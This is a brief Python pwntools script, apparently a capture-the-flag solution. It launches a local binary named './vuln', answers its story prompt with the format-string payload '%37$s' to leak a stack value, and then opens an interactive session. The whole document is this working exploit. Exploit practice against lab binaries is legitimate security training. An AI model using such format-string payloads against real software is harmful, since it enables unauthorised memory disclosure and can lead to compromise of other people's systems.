#!/usr/bin/env python3

from pwn import *

r = process("./vuln")

r.sendlineafter("Tell me a story and then I'll tell you one >>", "%37$s")
r.recvuntil("Here's a story -")
r.interactive()
